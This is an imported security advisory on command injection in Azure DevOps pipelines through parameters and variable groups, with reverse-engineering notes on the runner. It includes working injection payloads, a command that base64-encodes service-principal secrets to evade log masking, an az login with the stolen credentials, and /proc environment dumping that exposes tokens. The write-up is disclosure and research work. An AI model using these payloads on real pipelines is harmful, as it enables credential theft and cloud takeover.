---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-05-01_azure-devops-cicd-pipelines-command-injection-with-parameters-variables-and-a-di.md
original_filename: 2023-05-01_azure-devops-cicd-pipelines-command-injection-with-parameters-variables-and-a-di.md
title: Azure Devops CICD Pipelines - Command Injection With Parameters, Variables
  And A Discussion On Runner Hijacking
category: documents
detected_topics:
- command-injection
- supply-chain
- oauth
- xss
- otp
- automation-abuse
tags:
- imported
- documents
- command-injection
- supply-chain
- oauth
- xss
- otp
- automation-abuse
language: en
raw_sha256: ee5243ca0ea5d9a7519bea02911216184843ad4257caf87264be36a70ef9458a
text_sha256: 4da5d7d64dd4f04d3388b4598a9cb3e61f93d652bbac8ff359223617a938dfbe
ingested_at: '2026-06-28T07:32:20Z'
sensitivity: unknown
redactions_applied: false
---

# Azure Devops CICD Pipelines - Command Injection With Parameters, Variables And A Discussion On Runner Hijacking

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-05-01_azure-devops-cicd-pipelines-command-injection-with-parameters-variables-and-a-di.md
- Source Type: markdown
- Detected Topics: command-injection, supply-chain, oauth, xss, otp, automation-abuse
- Ingested At: 2026-06-28T07:32:20Z
- Redactions Applied: False
- Raw SHA256: `ee5243ca0ea5d9a7519bea02911216184843ad4257caf87264be36a70ef9458a`
- Text SHA256: `4da5d7d64dd4f04d3388b4598a9cb3e61f93d652bbac8ff359223617a938dfbe`


## Content

---
title: "Azure Devops CICD Pipelines - Command Injection With Parameters, Variables And A Discussion On Runner Hijacking"
page_title: "Azure DevOps CICD Pipelines - Command Injection with Parameters, Variables and a discussion on Runner hijacking"
url: "https://pulsesecurity.co.nz/advisories/Azure-Devops-Command-Injection"
final_url: "https://pulsesecurity.co.nz/advisories/Azure-Devops-Command-Injection"
authors: ["Sana Oshika (@bigshika)"]
programs: ["Microsoft (Azure DevOps Pipelines)"]
bugs: ["CI/CD", "OS command injection", "RCE"]
publication_date: "2023-05-01"
added_date: "2023-05-04"
source: "pentester.land/writeups.json"
original_index: 1205
---

# Azure DevOps CICD Pipelines - Command Injection with Parameters, Variables and a discussion on Runner hijacking

by Sana Oshika

### Recent Releases

####  advisories [See all](/advisories)

  * 12/6/24  [CodiMD Unauthorised Image Access](/advisories/codimd-missing-image-access-controls)
  * 5/6/24  [Slack Web Hook Message Injection Advisory](/advisories/slack-message-injection)
  * 18/3/24  [Bypassing USBGuard on Linux](/advisories/usbguard-bypass)
  * 20/9/23  [HDF5 - Multiple Memory Corruption Vulnerabilities](/advisories/hdf5-memory-corruption)

* * *

####  articles [See all](/articles)

  * 26/5/26  [Stealing Browser Sessions with DevTools](/articles/stealing_browser_sessions_with_devtools)
  * 22/5/26  [Timeboxed Penetration Testing - Pulse Security’s Approach](/articles/timeboxed-penetration-tests)
  * 13/2/26  [Harvesting Intune Device Scripts Without Tools](/articles/intune-device-scripts)
  * 14/1/26  [Sensitive data in URLs: Why private links aren’t private anymore due to threat intelligence feeds](/articles/unguessable_url_issues)

May 1 2023

This article discusses a vulnerability with Azure DevOps that can be exploited by users able to run pipelines with user-controlled variables. The vulnerability allows malicious users with access to edit runtime parameter values to inject shell commands that execute on the pipeline runner. This can compromise the runner and allow access to sensitive information such as secrets used for deployments and Azure service principal credentials.

In CI/CD systems, if the attacker can control the pipeline templates (by compromising a legitimate developer, for example) then they can compromise the underlying runner and it’s game over. OWASP call this the [Poisoned Pipeline Execution](https://owasp.org/www-project-top-10-ci-cd-security-risks/CICD-SEC-04-Poisoned-Pipeline-Execution) attack and it’s currently Number 4 on the [OWASP CI/CD Top Ten](https://owasp.org/www-project-top-10-ci-cd-security-risks/). This advisory came about because control of parameters and variable groups, without direct access to modify the pipeline template, can lead to the same outcome: An attacker compromising the underlying pipeline runner and gaining unauthorised access to all systems the runner can access.

This release includes the reverse engineering steps used to better understand the Azure DevOps runner logic, and has been included here so other researchers and security professionals can continue where I left off. The test environment setup and reverse engineering steps are included after the advisory section. This release discusses injection into `inlinescript`, `script`, or `AzureCLI` task types. If you’d like to dig into the potential impacts of injection into other task types, the reversing steps are there for you.

Note: We will be using the term ‘runner’ and ‘agent’ interchangeably in this release. Both refer to the self-hosted or Microsoft-hosted virtual machine or container which is doing the pipeline deployment.

# Background

In response to developer concerns around repeatability and deployment velocity, CI/CD systems arose. By writing pipeline definitions into code and thus version control, developers could control build and deployment steps programatically. Continuous integration/deployment meant that builds could be queued up at any time, without waiting for release windows and having months between releases.

Azure DevOps is an amalgam of all of of Microsoft’s developer collaboration tooling - things like work tracking, source repositories, and of course build pipelines find a home there. As a result, it’s a geological strata of older services such as TFS, Visual Studio Team Services, Visual Studio Online.

At the heart of it are the Azure DevOps pipelines. Each pipeline is defined by a template file that is checked into version control. The template file defines what tasks will be run. Tasks are predefined building blocks that you can put together to form a pipeline. For example, you can add in a task that fetches secrets from Azure Key Vault, a task that runs `dotnet build`, or a task that deploys a particular kind of resource to Azure. You can put in variables into those tasks to customise them according to the software you’re trying to build.

From a security perspective, the issue arises with the access the CI/CD infrastructure has to the environments it’s deploying to. If a developer (or an attacker who has compromised a developer) can control the pipeline, they can compromise the underlying runner with a malicious pipeline and gain access to the credentials used to deploy into the target systems. Without granular segmentation of runners and additional setup, this can mean that one runner responsible for deploying to dev, test, pre-production and production environments holds god-mode credentials for all these environments.

This makes CI/CD pipelines a valuable target, and results in a high-impact if there are vulnerabilities.

# Advisory

The following advisory was sent to MSRC on the 24th of February 2023. Microsoft declined to remediate with the following response:

> It is not recommended to allow user to modify variables that are inside scripts. Here is a blogpost regarding this scenario https://devblogs.microsoft.com/devops/pipeline-argument-injection/ and here is our recommendation https://learn.microsoft.com/en-us/azure/devops/pipelines/security/inputs?view=azure-devops.

The following quote from the linked article explains the response a little better:

> A quick note before we begin: security is a shared responsibility. Microsoft tries very hard to set safe, sensible defaults for features we deliver. Sometimes we make mistakes, and sometimes threats evolve over time. We have to balance security with “not breaking people’s things”, especially for developer tools. Plus, we can’t control how customers use the features we build. The purpose of this series is to teach the problems, which we hope helps you avoid them in practice.

## Summary

Variables and parameters used in Azure DevOps pipelines can be used to inject shell commands that run on the Azure DevOps runner. A malicious user with access to edit parameters, but no direct pipeline template access, can exploit this vulnerability to compromise the DevOps runner and subsequently gain access to sensitive information such as secrets used for deployments and Azure service principal credentials. This issue affects both Azure DevOps cloud and self-hosted build runners.

Any run-time or compile-time user-controlled variable or parameters used in a script or Azure CLI task can be used to inject shell commands into the task due to insecure inclusion of user-controlled variable strings; allowing the use of various shell injection characters. An attacker with the ability to control a parameter can compromise the underlying build runner, where they can exfiltrate credentials and source code, and potentially gain access to cloud environments or third-party services.

This problem is exacerbated with variable groups, as a variable defined within a variable group with the same name as a variable hard-coded within a template will override the hard-coded variable. A user with edit access to a variable group used within the template can effectively overwrite any variable in the pipeline, making command injection much more likely. Edit access to variable groups is available via default permissions for any user able to run pipelines.

## Details

The following figure shows an example pipeline which includes input from runtime parameters, variable groups, and hard-coded template variables, which will be used for the following examples.
  
  
  # Sample pipeline with parameters and variables
  trigger:
  - none
  parameters:
  - name: testParameter
  displayName: Test Parameter
  type: string
  default: hihi
  variables:
  - name: static_variable
  value: initialValue
  - group: test-variable-group
  pool:
  vmImage: ubuntu-latest
  steps:
  - script: echo $
  displayName: 'A script with a parameter'
  - script: |
  echo $(variableGroupVariable)
  displayName: 'A script using a variable group variable'
  - script: |
  echo $(static_variable)
  displayName: 'A script using a variable group variable'
  

## Runtime Parameter Command Injection

If a user has permission to run a pipeline that has runtime user-controlled string parameters defined and used within pipeline script or Azure CLI task inline scripts, then these parameters can be used to inject script that is executed on the build runner.

The following screenshot shows an example of a command injection performed via a runtime parameter:

[![](/assets/images/releases/2023-04-28-azure-devops/azure1.png)](/assets/images/releases/2023-04-28-azure-devops/azure1.png)

The following runner log shows the resulting command execution on the runner:

[![](/assets/images/releases/2023-04-28-azure-devops/azure2.png)](/assets/images/releases/2023-04-28-azure-devops/azure2.png)

## Variable Group Variable Command Injection

If a user has permission to edit a variable group with any variables used in a pipeline script or Azure CLI task inline scripts, then the variable group can be used to inject script that is executed on the build runner. Either an existing variable can be edited or a new variable can be created with the same name as one hard-coded into the template.

The following screenshot shows an example of a command injection performed via variable group:

[![](/assets/images/releases/2023-04-28-azure-devops/azure3.png)](/assets/images/releases/2023-04-28-azure-devops/azure3.png)

The following runner log shows the resulting command execution on the runner:

[![](/assets/images/releases/2023-04-28-azure-devops/azure4.png)](/assets/images/releases/2023-04-28-azure-devops/azure4.png)

## Attack Details

A common use case for Azure DevOps is a company hosting their code, including pipeline template YAML file, on an external code repository and using Azure DevOps pipelines for deployment. Access is then controlled and some users (e.g., contractors, QA engineers) may be given restricted access to Azure DevOps to run build and deploy pipelines, without any view or edit access to the source code repository (including the deployment pipeline template). If one of these users is compromised, then command injection is possible despite their account having no edit access to the pipeline template.

Other production scenarios have been encountered where specific users may be given the permissions to execute pipelines with specific parameters, but are not trusted with access to modify pipeline details. If runtime parameters are used in any scripting steps, the command injection can be added at runtime via the Run Pipeline API or the UI. If variable groups are used, then depending on which variable is used within the script task, the attacker can either edit the variable group to change the value of an existing variable or create a new variable with the same name as one used in the pipeline template, as shown earlier in this advisory.

These parameters/variables can then inject script into the `inlinescript`, `script`, or `AzureCLI` task type. The variables and parameters can be injected via the UI or the API; newline injection only works via the API due to input escaping performed by the front end JavaScript. Parameter injection may also be possible with other task types. The following injection techniques show examples that can be used in either runtime parameter or variable group attacks.

### Examples

The following output is achieved by using the following newline payload as a runtime parameter. We’re going to have the pipeline run the `env` command which will output the current environment variables.
  
  
  'this is newline escaping via the API'\nenv
  

This request was then sent to the Azure DevOps API, which ran the pipeline and gave the output shown below.
  
  
  POST /...redacted.../ebc7628f-3f9b-4e4b-b460-ca00c225cc11/_apis/pipelines/5/runs HTTP/2
  Host: dev.azure.com
  Cookie: ...redacted... 
  Content-Length: 187
  ...ommitted for brevity...
  {"stagesToSkip":[],"resources":{"repositories":{"self":{"refName":"refs/heads/main"}}},"templateParameters":{"testParameter":"'this is newline escaping via theAPI'\nenv"},"variables":{}}
  

[![](/assets/images/releases/2023-04-28-azure-devops/azure5.png)](/assets/images/releases/2023-04-28-azure-devops/azure5.png)

Similarly, the follow techniques also work:

#### Semicolons
  
  
  "AAA"; env;
  

#### Backticks
  
  
  "AAA" `env`
  

#### Braces
  
  
  "AAA" $(env)
  

## Root Cause

All the above string patterns are injected directly into the script without input validation or output encoding, which allows for script injection. Variables are input into the Azure DevOps web interface, and eventually end up included in a bash or PowerShell script executed on the runner. This allows a low privilege attacker direct access to the underlying build runner, where they can exfiltrate credentials and source code, and potentially gain access to cloud environments or third-party service credentials.

Within the self-hosted runner, the pipeline variable substitution takes place in the `Microsoft.VisualStudio.Services.Agent.Util.VarUtil.ExpandValues(IHostContext context, Idictionary<string, string> source, Idictionary<string,string> target)` function, in the `Agent.Worker.dll` library, where the variables are directly substituted within the script. Neither the Azure DevOps server or the Azure DevOps runner implement any form of filtering of dangerous characters when substituting variables or parameters into script, which makes this attack possible.

The following screenshots show the contents of a multi-line script task which was processed by this function by the `Agent.Worker` process on the runner. The string value with the variable substitution performed was subsequently loaded into the `INPUT_SCRIPT` environment variable and the Node.JS task runner executed:

[![](/assets/images/releases/2023-04-28-azure-devops/azure9.png)](/assets/images/releases/2023-04-28-azure-devops/azure9.png)

On method entry, the input text contains the raw script data:

[![](/assets/images/releases/2023-04-28-azure-devops/azure10.png)](/assets/images/releases/2023-04-28-azure-devops/azure10.png)

After the method returns, the input has the parameters replaced with their respective values:

[![](/assets/images/releases/2023-04-28-azure-devops/azure11.png)](/assets/images/releases/2023-04-28-azure-devops/azure11.png)

## Post Exploitation - Azure CLI Task

The Azure CLI task runs scripts using the Azure service configured via the project settings and can be exploited in the same way. If the pipeline uses any user-controlled parameters/variables within the task, they are vulnerable to injection.

Azure credentials are injected into the pipeline for that task only, for use in the `az login` command, and then cleared at the end of the task. During this step, the Azure credentials can be exfiltrated or the Azure CLI task can be used directly to gain access to the Azure environment. This access can be used to deploy or destroy resources and exfiltrate credentials and data.

The following pipeline template was used as a proof of concept:
  
  
  trigger:
  - main
  parameters:
  - name: azCLIparam
  displayName: AzCLItask Parameter
  type: string
  default: azCLIparam1
  pool:
  vmImage: ubuntu-latest
  steps:
  - task: AzureCLI@2
  displayName: Azure CLI task
  inputs:
  azureSubscription: Azure subscription 1 (56e74e8c-…redacted…)
  scriptType: bash
  scriptLocation: inlineScript
  inlineScript: |
  echo $
  

The following figure shows the pipeline run with the runtime parameter:
  
  
  hi;cat /home/vsts/work/_temp/.azclitask/service_principal_entries.json;cat /home/vsts/work/_temp/.azclitask/service_principal_entries.json | base64
  

[![](/assets/images/releases/2023-04-28-azure-devops/azure12.png)](/assets/images/releases/2023-04-28-azure-devops/azure12.png)

[![](/assets/images/releases/2023-04-28-azure-devops/azure13.png)](/assets/images/releases/2023-04-28-azure-devops/azure13.png)

The log output scrubbing successfully masked the raw `client_id` and `client_secret`; however, these could be extracted by encoding them as base64.

The following figure shows the extracted service credentials being used to log into Azure from the attacker’s host:
  
  
  $ echo WwogICAgewogICAgIC…redacted…tDTGZSS21BPT0iCiAgICB9Cl0= | base64 -d
  [
  {
  "tenant": "46197d47-…redacted…",
  "client_id": "49d102ff-…redacted…",
  "client_secret": "Ol7sW…redacted…"
  }
  $ az login --service-principal -u 49d102ff-…redacted… -p Ol7sWr…redacted… --tenant 46197d47-…redacted…
  [
  {
  "cloudName": "AzureCloud",
  "homeTenantId": "46197d47-…redacted…",
  "id": "56e74e8c-…redacted…",
  "isDefault": true,
  "managedByTenants": [],
  "name": "Azure subscription 1",
  "state": "Enabled",
  "tenantId": "46197d47-…redacted…",
  "user": {
  "name": "49d102ff-…redacted…",
  "type": "servicePrincipal"
  }
  }
  ]
  

At this point, the attacker can perform any actions in the Azure Cloud which the service principal assigned to the runner can perform. Azure service principal extraction is being used as an example here. The important thing to remember is that if the runner can access a system, and the attacker can execute code on the runner, then the attacker can access the system.

## Impact

A compromise of the underlying runner exposes all secrets and credentials which are used by pipeline tasks on that runner. All secrets are injected via environment variables then subsequently scrubbed by the Azure task library; however, an attacker who can compromise the runner may obtain these secrets by viewing the pipeline job information directly, or by viewing the runner process environment variables prior to scrubbing by the Azure task library. These secrets can include key vault secrets, secret variables, Azure credentials, among others.

The `System.AccessToken` variable can be accessed via the script task, which allows the script to then access any resources or commands available to the build runner within the Azure DevOps API. The access token is only valid for the duration of the pipeline.

There is no restriction on traffic to external services for runners hosted by Azure, so data can be freely exfiltrated and external software packages can be installed.

## Limitations

Testing was performed using Linux runners and bash. Inline script with the Azure CLI and script tasks can also use PowerShell, which was not tested. There may also be other types of injection available via other task types; however, only script and Azure CLI tasks were considered for this advisory.

# Reverse Engineering and Testing Azure DevOps Pipelines

This next section was not included in the advisory to MSRC, and is intended to explain the setup for reverse engineering and performing further security research on Azure DevOps CI/CD systems. The same techniques can be applied to other similar technologies. With many thanks to Denis Andzakovic for his help in the reverse engineering work.

## Background

Each Azure DevOps pipeline is defined by a template file that is checked into version control. The template file defines what tasks will be run. Tasks are predefined building blocks that you can put together to form a pipeline. For example, you can add in a task that fetches secrets from Azure Key Vault. Or a task that runs `dotnet build`. Or a task that deploys a particular kind of resource to Azure. You can put variables into those tasks to customise them according to the software you’re trying to build.

These pipelines definitions are then sent to the an Azure DevOps server. When a pipeline run is triggered, the definition, variables, configuration and so forth are sent to a Task Runner that is a single purpose VM you can self-host, or container that is destroyed after every run. Of course, sometimes there isn’t a task for what you want to do, or maybe you’ve got an existing script you want to run. In that case, you can use the built-in CLI task to write inline script directly into the template that is then executed directly on the runner.

In reality, all of these tasks are scripts running in a Node environment which is installed on-the-fly by the DevOps runner.

The build agent on the Task Runner is what transforms source code into a deployable artifact and then deploys it. At minimum, this means the runner requires some access to your source code and the destination environment (generally public cloud). The build agent has more access into sensitive areas of the environment than most users, as deploying software typically requires significant privileges within an environment.

The following flow diagram should help explain what’s happening:

[![](/assets/images/releases/2023-04-28-azure-devops/azure-flow.png)](/assets/images/releases/2023-04-28-azure-devops/azure-flow.png)

## Why?

So why go to the effort of reverse-engineering? Why not just rely on black-box testing? Firstly, understanding breeds better bugs. If we know how a platform works through reverse engineering, we can build a solid understanding of how a system works and then discover better vulnerabilities and explain their root causes. Secondly, we can. The self-hosted DevOps runner builds are made available by Azure and we might as well take advantage of them. Sure, we can find a bug black box style and make some reasonable guesses as to what’s happening under the hood, but what’s happening under the hood had some surprises too.

## Setup

To begin, we need to self-host a runner. This lets use inspect what the runner is doing and reverse engineer it. [Microsoft have a guide on setting up runners](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/v2-linux?view=azure-devops#download-and-configure-the-agent), and the rest of section is written assuming you’ve set up a Linux virtual machine and installed the runner. If you want to use Burp Proxy to intercept traffic, you should run the config step like this instead:
  
  
  /config.sh --proxyurl http://127.0.0.1:8080
  

## Traffic Interception

We used Portswiggers Burp Proxy to intercept traffic. Go to Burp > Settings > Proxy > Import/export CA certificate and export your certificate in DER format.

[![](/assets/images/releases/2023-04-28-azure-devops/burp1.png)](/assets/images/releases/2023-04-28-azure-devops/burp1.png)

You can then convert the resulting certificate to `.crt` format and install it to your certificate store (we’re assuming you’re running Debian or simliar here).
  
  
  openssl x509 -in ~/tools/burpcert -inform DER -out burpcert.crt
  sudo cp burpcert.crt /usr/local/share/ca-certificates/burp.crt
  sudo update-ca-certificates
  

Once you’ve got that plus the setup on the Azure DevOps side, you can run `./run.sh` in your local VM with your runner. Then in Azure DevOps, you can start a pipeline run. As long as the `Pool` value in the YAML template is set to use the pipeline pool containing your self-hosted runner, it should then send the requests to your self-hosted agent, and Burp should be able to intercept the requests made by the agent to the DevOps server.

Shown below is the local runner making a request to the cloud DevOps server, and the DevOps server responding with a job to be executed.

[![](/assets/images/releases/2023-04-28-azure-devops/burp2.png)](/assets/images/releases/2023-04-28-azure-devops/burp2.png)

## Decompilation

Next we want to decompile the runner binaries. These are mainly dotnet code, so [ILSpy is our friend](https://github.com/icsharpcode/ILSpy/releases). Then download an [Azure DevOps pipeline agent binary](https://github.com/Microsoft/azure-pipelines-agent/releases) and extract the release. After extracting the files, you should end up with something that looks like this, full of DLLs. You could also pull these files out of your installed agent directory.
  
  
  Directory of C:\Users\sanao\Documents\vsts-agent-linux-x64-2.214.1\bin
  
  04/28/2023  02:16 PM  <DIR>  .
  04/28/2023  02:16 PM  <DIR>  ..
  12/13/2022  03:18 AM  86,584 Agent.Listener
  12/13/2022  03:18 AM  163,207 Agent.Listener.deps.json
  12/13/2022  03:25 AM  346,000 Agent.Listener.dll
  12/13/2022  03:18 AM  93,788 Agent.Listener.pdb
  12/13/2022  03:18 AM  175 Agent.Listener.runtimeconfig.json
  12/13/2022  03:18 AM  86,584 Agent.PluginHost
  12/13/2022  03:18 AM  161,564 Agent.PluginHost.deps.json
  12/13/2022  03:25 AM  29,552 Agent.PluginHost.dll
  12/13/2022  03:18 AM  2,088 Agent.PluginHost.pdb
  12/13/2022  03:18 AM  175 Agent.PluginHost.runtimeconfig.json
  12/13/2022  03:18 AM  136,578 Agent.Plugins.deps.json
  12/13/2022  03:25 AM  426,352 Agent.Plugins.dll
  12/13/2022  03:25 AM  30,576 Agent.Plugins.Log.TestResultParser.Contracts.dll
  12/13/2022  03:25 AM  85,360 Agent.Plugins.Log.TestResultParser.Parser.dll
  ...yoink...
  333 File(s)  109,332,997 bytes
  

Then you can run ILSpy to get the decompiled code for a selected DLL.

[![](/assets/images/releases/2023-04-28-azure-devops/ilspy1.png)](/assets/images/releases/2023-04-28-azure-devops/ilspy1.png)

Take a look through the files; you’ll see a lot of different projects within it, which gives us a general idea of the different areas. We see that there’s an `AgentListener` that’s responsible for connecting out to the Azure DevOps server, and receives an encrypted message from the Azure DevOps cloud server (as shown in the Traffic Interception step).

You can save these as code repositories, complete with `.csproj` files, and do more digging through the code with your preferred code editor.

## Initial Analysis

As the runner is running locally, you can trigger a pipeline and run `ps` while the pipeline is executing to see what processes and commands it’s running. Edit (or inject) a `sleep` command into your pipeline template in a script task, then as the runner is sleeping, run your `ps -ef` command and you should see something like this:
  
  
  $ ps -ef | grep myagent
  sanao  3808  3804  0 17:32 pts/0  00:00:03 /home/sanao/projects/myagent/bin/Agent.Listener run
  sanao  5000  3808 39 17:41 pts/0  00:00:04 /home/sanao/projects/myagent/bin/Agent.Worker spawnclient 118 126
  sanao  5097  5000 14 17:41 pts/0  00:00:00 /home/sanao/projects/myagent/externals/node16/bin/node /home/sanao/projects/myagent/_work/_tasks/CmdLine_d9bafed4-0b18-4f58-968d-86655b4d2ce9/2.212.0/cmdline.js
  sanao  5104  5097  0 17:41 pts/0  00:00:00 /usr/bin/bash --noprofile --norc /home/sanao/projects/myagent/_work/_temp/fbc6c360-806a-483e-adba-dc00994aa858.sh
  sanao  5107  3315  0 17:41 pts/1  00:00:00 grep myagent
  

We can then dump the environment variables from the `node` process and check if there is anything interesting:
  
  
  $ cat /proc/5097/environ 
  ...yoink...ENDPOINT_URL_SYSTEMVSSCONNECTION=https://dev.azure.com/sanaopulsetesting/ENDPOINT_AUTH_SYSTEMVSSCONNECTION={"parameters":{"AccessToken":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dDI6Im9PdmN6NU1fN3AtSGpJS2xGWHo5M3VfVjBabyJ9.eyJuYW1laWQiOiI3ZWM5YTZyYi0yZmJiLTQ2NDktODA1OC0zNjU5N2ZjNmNlMDYiLCJzY3AiOiJhcHBfdG9rZW4iLCJhdWkiOiJhZGRkZmM5OS0yMWI5LTRlYTktYWE5Zi01ZDA4ZmE5YzZhNzciLC...redacted...1EkZ9ySi3UUdlLQNZx5ihZSolDXkEEwcgji2jLUSQtpE-i6GIWco-WhI_afMminVg_Oed7ScryYeg8g"},"scheme":"OAuth"}ENDPOINT_AUTH_SCHEME_SYSTEMVSSCONNECTION=OAuthENDPOINT_AUTH_PARAMETER_SYSTEMVSSCONNECTION_ACCESSTOKEN=eyJ0eXAiOiJKV4QiLCJhbGciOiJSUzI1NiIsIng1dCI6Im9PdmN6NU1f...redacted...IpvT_0tdWo7CmgvHTNtPptkK7PFlPnsx2S0VqynqXgbJReRF948jeJGLMfPwBzwu7Cv42uGOEpEA7BagZvWX-Gn1EkZ9ySi3UUdlLQNZx5ihZSolDXkEFwcgji2jLUSQtpE-i6GIWco-WhI_afMminVg_Oed7ScrwYeg8gSYSTEM_TEAMFOUNDATIONSERVERURI=https://dev.azure.com/sanaopulsetest/SYSTEM_TASKINSTANCEID=bd05475d-acb5-5619-3ccb-c46842dbc497BUILD_REPOSITORY_NAME=acmeSYSTEM_JOBATTEMPT=1BUILD_QUEUEDBY=sana_pulsetest2BUILD_SOURCEVERSIONAUTHOR=Sana OBUILD_STAGINGDIRECTORY=/home/sanao/projects/myagent/_work/1/aAGENT_ISSELFHOSTED=1...yoink...TEST123=test123SYSTEM_PHASEDISPLAYNAME=JobSYSTEM_PHASEATTEMPT=1TEMPLATEINJECTION=testtesttest...yoink... 
  

This shows that all pipeline configuration data is passed to the NodeJS Task via environment variables; however, any variables marked `secret` have not been included in the environment, so that needs investigation at a different level to find out where the secrets are going. Looking at all of the variables passed into the environment, this appears to be the main communication mechanism between the `Agent.Worker` process and the NodeJS process that it spawns.

We can also get an idea of the logic within a Task itself, because the built-in tasks are open source and available on the [Microsoft/azure-pipeline-tasks GitHub repository](https://github.com/microsoft/azure-pipelines-tasks/tree/master/Tasks). This gives us a better picture of how those are processed and how the YAML is consumed, particularly around variables.

## Extracting Pipeline Configuration Data

The runner will constantly poll the server, when a job is available it’ll receive an an encrypted JSON blob in response to a `GET /<account>/_apis/distributedtask/pools/12/messages?sessionId=8441a496-2567-4060-8023-6e9910a50d18&lastMessageId=36` or similar. The response will look like this:
  
  
  {"messageId":37,"messageType":"PipelineAgentJobRequest","iv":"DeY7u/SJaAe7wn+qTsCWlA==","body":"TOcL6shbJJ92g55WPuz3euzYqy4jeEvL0+A9W7GF1zf198O7UjNIXwwaVnZRomLx7OVfTv7qdKUUHG5G1mHwu6/skPGpEMX0ewF1iWKmEK2xRm/BOXJl7w1PxTVpUkAbo/DZ7tDDHvIuEtxdbe4hILD81MBgmuTC4J0a2YkutZsChaTDUtlImfNfsUDngukB8YjGtpyMH/ef2r9gsOpR72MJhhZbCE1o9U+S4nCUlHAr47y9XLVnC8SJhT/8aVzEMT0vP+wMF9x49eOOgSdEVSoAOtoVDjsFp39bp5LkYjWcaRkkAqDwalAbcHfHUAo7HJjYJAL52zLlGnyWDWOrTgvtc0Klky3FPCrhV2tr4aIw+9B4ULR/XtTZ15JkWdK4WbjhumsximLlhvA8cNN+hSP8yP+nGytFkwuuX+rO5BLg75Bxjt2CBg2jtz0k1Uq3vVVapU1SDY2fICptAsoXhVKLa1dQO7qSYrLkleUqE+4dY848+T3sJy7r8OTVW9Qu/...yoink...
  

This is an encrypted JSON blob that contains a nested encrypted JSON object under `body`. The encrypted JSON includes the tasks, secrets, etcetera. A search for `PipelineAgentJobRequest` (which we get from the `messageType` above) in the decompiled `Agent.Listener` code shows the following:
  
  
  Microsoft.VisualStudio.Service/Agent.cs
  346:	else if (string.Equals(message.MessageType, "JobRequest", StringComparison.OrdinalIgnoreCase) || string.Equals(message.MessageType, "PipelineAgentJobRequest", StringComparison.OrdinalIgnoreCase))
  360:		case "PipelineAgentJobRequest":
  

Digging into this further shows:
  
  
  360	case "PipelineAgentJobRequest":
  361		pipelineJobMessage = JsonUtility.FromString<Microsoft.TeamFoundation.DistributedTask.Pipelines.AgentJobRequestMessage>(message.Body);
  362		break;
  363	}
  364	jobDispatcher.Run(pipelineJobMessage, runOnce);
  365	if (runOnce)
  366	{
  367		base.Trace.Info("One time used agent received job message.");
  368		runOnceJobReceived = true;
  369	}
  370 }
  
  

Which looks hopeful, since its accessing the `Body` property in the `message` object. `message` is defined here:
  
  
  272  Task<TaskAgentMessage> getNextMessage = _listener.GetNextMessageAsync(messageQueueLoopTokenSource.Token);
  ...yoink...
  325  message = await getNextMessage;
  326  base.HostContext.WritePerfCounter("MessageReceived_" + message.MessageType);
  

`GetNextMessageAsync` is where runner attempts to decrypt the message by calling `DecryptMessage`:
  
  
  Microsoft.VisualStudio.Service/MessageListener.cs
  141 
  142  public async Task<TaskAgentMessage> GetNextMessageAsync(CancellationToken token)
  143  {
  144  base.Trace.Entering("GetNextMessageAsync");
  145  ArgUtil.NotNull(_session, "_session");
  146  ArgUtil.NotNull(_settings, "_settings");
  147  bool encounteringError = false;
  148  int continuousError = 0;
  149  _ = string.Empty;
  150  Stopwatch heartbeat = new Stopwatch();
  151  heartbeat.Restart();
  152  TaskAgentMessage message;
  153  while (true)
  154  {
  155  token.ThrowIfCancellationRequested();
  156  message = null;
  157  try
  158  {
  159  message = await _agentServer.GetAgentMessageAsync(_settings.PoolId, _session.SessionId, _lastMessageId, token);
  160  message = DecryptMessage(message);
  
  

`DecryptMessage` contains the decryption code:
  
  
  249  private TaskAgentMessage DecryptMessage(TaskAgentMessage message)
  250  {
  251  if (_session.EncryptionKey == null || _session.EncryptionKey.Value.Length == 0 || message == null || message.IV == null || message.IV.Length == 0)
  252  {
  253  return message;
  254  }
  255  using Aes aes = Aes.Create();
  256  using ICryptoTransform decryptor = GetMessageDecryptor(aes, message);
  257  using MemoryStream body = new MemoryStream(Convert.FromBase64String(message.Body));
  258  using CryptoStream cryptoStream = new CryptoStream(body, decryptor, CryptoStreamMode.Read);
  259  using StreamReader bodyReader = new StreamReader(cryptoStream, Encoding.UTF8);
  260  message.Body = bodyReader.ReadToEnd();
  261  return message;
  262  }
  263
  264  private ICryptoTransform GetMessageDecryptor(Aes aes, TaskAgentMessage message)
  265  {
  266  if (_session.EncryptionKey.Encrypted)
  267  {
  268  using (RSACryptoServiceProvider rsa = base.HostContext.GetService<IRSAKeyManager>().GetKey())
  269  {
  270  return aes.CreateDecryptor(rsa.Decrypt(_session.EncryptionKey.Value, RSAEncryptionPadding.OaepSHA1), message.IV);
  271  }
  272  }
  273  return aes.CreateDecryptor(_session.EncryptionKey.Value, message.IV);
  274  }
  
  

From the above we can see `_session.EncryptionKey` is set, and that’s subsequently decrypted by another key. There are two classes that implement `IRSAKeyManager`, one uses DPAPI calls so that’s not going to help us on Linux, this is the `GetKey` from the other one, `RSAFileKeyManager.cs`:
  
  
  57  public RSACryptoServiceProvider GetKey()
  58  {
  59  if (!File.Exists(_keyFile))
  60  {
  61  throw new CryptographicException(StringUtil.Loc("RSAKeyFileNotFound", _keyFile));
  62  }
  63  base.Trace.Info("Loading RSA key parameters from file {0}", _keyFile);
  64  RSAParameters parameters = IOUtil.LoadObject<RSAParametersSerializable>(_keyFile).RSAParameters;
  65  RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider();
  66  rSACryptoServiceProvider.ImportParameters(parameters);
  67  return rSACryptoServiceProvider;
  68  }
  

We could continue searching through the code, or we can try grep for `rsa` in the agent directory and see what comes up:
  
  
  $ grep -r rsa | grep -v node
  _diag/Agent_20230119-232554-utc.log:[2023-01-19 23:25:54Z INFO HostContext] Well known config file 'RSACredentials': '/home/user/myagent/.credentials_rsaparams'
  _diag/Agent_20230119-232554-utc.log:[2023-01-19 23:25:54Z INFO RSAFileKeyManager] Loading RSA key parameters from file /home/user/myagent/.credentials_rsaparams
  _diag/Agent_20230119-232554-utc.log:[2023-01-19 23:25:54Z INFO RSAFileKeyManager] Loading RSA key parameters from file /home/user/myagent/.credentials_rsaparams
  _diag/Agent_20230119-232554-utc.log:[2023-01-19 23:25:54Z INFO RSAFileKeyManager] Loading RSA key parameters from file /home/user/myagent/.credentials_rsaparams
  

